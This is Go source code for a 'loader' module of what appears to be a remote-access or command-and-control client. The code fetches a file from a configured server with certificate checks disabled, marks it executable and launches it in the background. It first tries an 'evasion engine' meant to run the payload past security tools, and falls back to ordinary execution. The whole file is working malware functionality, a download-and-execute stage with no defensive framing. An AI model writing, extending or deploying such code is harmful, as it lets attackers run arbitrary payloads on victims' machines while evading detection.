package loader

import (
	"client/config"
	"client/modules/evasion"
	"client/utils"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

// Loader, file upload and execution management
type Loader struct {
	ServerURL     string      // Server URL
	TLSConfig     *tls.Config // TLS configuration
	MaxRetries    int         // Number of retries if failed
	evasionEngine evasion.Evasion
}

// LoaderResponse, represents the response from the server
type LoaderResponse struct {
	Success bool   `json:"success"`
	Message string `json:"message"`
	Hash    string `json:"hash,omitempty"`
	Size    int64  `json:"size,omitempty"`
}

// New, creates a new Loader instance
func New() *Loader {
	return &Loader{
		ServerURL:  fmt.Sprintf("https://%s:%s", config.SERVER_IP, config.SERVER_PORT),
		TLSConfig:  &tls.Config{InsecureSkipVerify: true}, // For development, certificate validation should be enabled in production
		MaxRetries: 3,
	}
}

// LoadAndRun, downloads the file from the server and runs it
func (l *Loader) LoadAndRun(serverFilePath, clientPath string, autoRun bool) error {
	// Determine if the target path is a directory or a file
	var localFilePath string
	var targetDir string

	// If the target path contains an extension or ends with '.', accept it as a file
	if filepath.Ext(clientPath) != "" || clientPath == "." {
		// Accept it as a file
		localFilePath = clientPath
		targetDir = filepath.Dir(clientPath)
	} else {
		// Accept it as a directory
		targetDir = clientPath
		fileName := filepath.Base(serverFilePath)
		localFilePath = filepath.Join(clientPath, fileName)
	}

	// Create target directory
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		return fmt.Errorf("target directory creation failed: %v", err)
	}

	// Download file
	fmt.Printf("Downloading: %s -> %s\n", serverFilePath, localFilePath)

	// Create HTTP request
	url := fmt.Sprintf("%s/filetransfer?action=upload&path=%s", l.ServerURL, serverFilePath)

	client := utils.GetFileTransferHTTPClient()

	// Send request
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return fmt.Errorf("request creation failed: %v", err)
	}

	// Add Keep-Alive header
	req.Header.Set("Connection", "keep-alive")

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("file download failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server error: %s", resp.Status)
	}

	// Get file hash and size
	fileHash := resp.Header.Get("X-File-Hash")

	// Create file
	file, err := os.Create(localFilePath)
	if err != nil {
		return fmt.Errorf("file creation failed: %v", err)
	}
	defer file.Close()

	// Write file
	hash := sha256.New()
	writer := io.MultiWriter(file, hash)

	startTime := time.Now()
	bytesTransferred, err := io.Copy(writer, resp.Body)
	if err != nil {
		return fmt.Errorf("file writing failed: %v", err)
	}

	// Hash validation
	calculatedHash := hex.EncodeToString(hash.Sum(nil))
	if fileHash != "" && calculatedHash != fileHash {
		os.Remove(localFilePath) // Delete incorrect file
		return fmt.Errorf("hash mismatch: expected %s, calculated %s", fileHash, calculatedHash)
	}

	elapsed := time.Since(startTime).Seconds()
	speed := float64(bytesTransferred) / elapsed / 1024 // KB/s

	fmt.Printf("Download completed: %s (%.2f KB/s)\n", localFilePath, speed)

	// Make file executable (Unix systems)
	if runtime.GOOS != "windows" {
		if err := os.Chmod(localFilePath, 0755); err != nil {
			return fmt.Errorf("file permissions change failed: %v", err)
		}
	}

	// Run file
	if autoRun {
		// Create evasion engine
		evasionEngine, err := evasion.New(evasion.DefaultOptions())
		if err != nil {
			fmt.Printf("Evasion engine creation failed: %v\n", err)
		} else {
			// Set evasion engine to loader
			l.evasionEngine = evasionEngine
			fmt.Println("[+] Evasion engine set successfully: WEM2")
		}

		return l.RunExecutable(localFilePath)
	}

	return nil
}

// RunExecutable, runs the specified file
func (l *Loader) RunExecutable(filePath string) error {
	fmt.Printf("Running file: %s\n", filePath)

	// If special evasion engine is set, use it
	if l.evasionEngine != nil {
		fmt.Println("[+] Using special evasion techniques...")
		err := l.evasionEngine.ExecutePayload(filePath)
		if err == nil {
			fmt.Printf("[+] File executed successfully (evasion): %s\n", filePath)
			return nil
		}

		fmt.Printf("[!] Special evasion techniques failed: %v\n", err)
		fmt.Println("[*] Trying normal execution...")
	}

	// If evasion engine is not set, use normal execution
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		// Run on Windows
		cmd = exec.Command("cmd", "/c", "start", filePath)
	} else {
		// Run on Unix/Linux/macOS
		cmd = exec.Command(filePath)
	}

	// Run in background
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("file execution failed: %v", err)
	}

	fmt.Printf("[+] File executed successfully: %s\n", filePath)
	return nil
}
